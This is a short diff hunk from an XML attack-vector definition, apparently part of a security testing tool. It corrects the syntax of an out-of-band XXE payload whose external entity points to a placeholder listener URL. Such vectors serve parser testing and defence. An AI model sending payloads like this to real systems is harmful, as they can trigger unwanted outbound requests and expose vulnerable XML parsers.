@@ -21,7 +21,7 @@
 <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
 <!DOCTYPE data [
 <!ELEMENT data (#PCDATA)>
-<!ENTITY url PUBLIC p "§tf_listenURL§">
+<!ENTITY url PUBLIC "p" "§tf_listenURL§">
 ]>
 <data>&url;</data>]]></directMessage>
 </attackvector>
